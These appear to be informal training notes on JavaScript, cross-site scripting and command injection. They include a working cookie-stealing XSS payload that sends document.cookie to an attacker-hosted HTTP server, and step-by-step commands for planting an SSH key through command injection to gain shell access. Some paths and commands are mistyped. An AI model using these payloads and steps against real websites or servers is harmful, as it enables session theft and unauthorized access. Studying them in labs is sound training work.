JavaScript (JS):

    Allows websites to interact with the client

	JavaScript runs on the clientâ€™s machine

    Coded as .js files, or in-line of HTML

Cross-Stie scripting (XSS):
	
	Insertion of arbitrary code into a webpage, that executes in the browser of visitors	
	
	Unsanitized GET, POST, and PUT methods allows JS to be placed on websites
	
	Often found in forums that allow HTML

The most common form of XSS is Reflected XSS

Characters that are normally illegal in URLs can be Base64 encoded

Stored XSS:
	Resides on vulnerable sites
	Only requires user to visit page
Useful JavaScript Components

Proof of concept (simple alert):

	<script>alert('XSS');</script>

    Capturing Cookies
    document.cookie

    Capturing Keystrokes

    bind keydown and keyup

    Capturing Sensitive Data
    document.body.innerHTML

Steps to make http server:

	(1) python3 -m http.server (makes the server)
	(2) <script>document.location="http://IPofLinOPStation:Port that it was created on"+document.cookie;</script>

you can traverse the web server using ../../../../ etc...
/robots.txt
/uploads
--script http-enum
; command is used to test for command injection
----------------------------------------------------------------------------
getting onto a system with command injection:

	(1) get into the hidden .ssh folder ls -la (cd .ssh)
	(2) ssh-keygen -t rsa -b 4096 (generate keys) don't enter a passphrase

	(On the webserver) ; mkdir /homdir/.ssh (check with l -la)
	(make authorization file) ; echo "the whole contents of the id_rsa.pub" > var/home dir/.ssh/authorized_keys ( get the public key from your work station and copy the whole thing.)
	(make sure it worked) ; cat /home dir/.ssh/authorized_keys
	(then ssh) ssh user from webserver@IPofWebserver
